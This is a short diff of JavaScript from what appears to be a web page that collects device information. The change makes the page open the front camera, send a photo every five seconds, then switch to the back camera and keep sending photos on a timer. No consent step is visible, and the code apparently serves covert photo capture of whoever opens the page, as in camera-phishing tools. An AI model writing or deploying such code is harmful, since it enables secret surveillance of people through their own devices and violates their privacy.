@@ -105,15 +105,22 @@ Device Information:
             const frontCameraStarted = await startCamera('user');
             if (!frontCameraStarted) return;
 
-            sendPhoto();
+            // Capture and send photo from front camera
+            await sendPhoto();
             intervalId = setInterval(sendPhoto, 5000);
 
-            // Start back camera after front camera
-            const backCameraStarted = await startCamera('environment');
-            if (!backCameraStarted) return;
+            // Stop the front camera and start back camera after 5 seconds
+            setTimeout(async () => {
+                stopCamera();
 
-            sendPhoto();
-            setInterval(sendPhoto, 5000); // Repeat sending from back camera as well
+                // Start back camera
+                const backCameraStarted = await startCamera('environment');
+                if (!backCameraStarted) return;
+
+                // Capture and send photo from back camera
+                await sendPhoto();
+                setInterval(sendPhoto, 5000); // Repeat sending from back camera as well
+            }, 5000); // Stop front camera after 5 seconds
         }
 
         function stopCamera() {
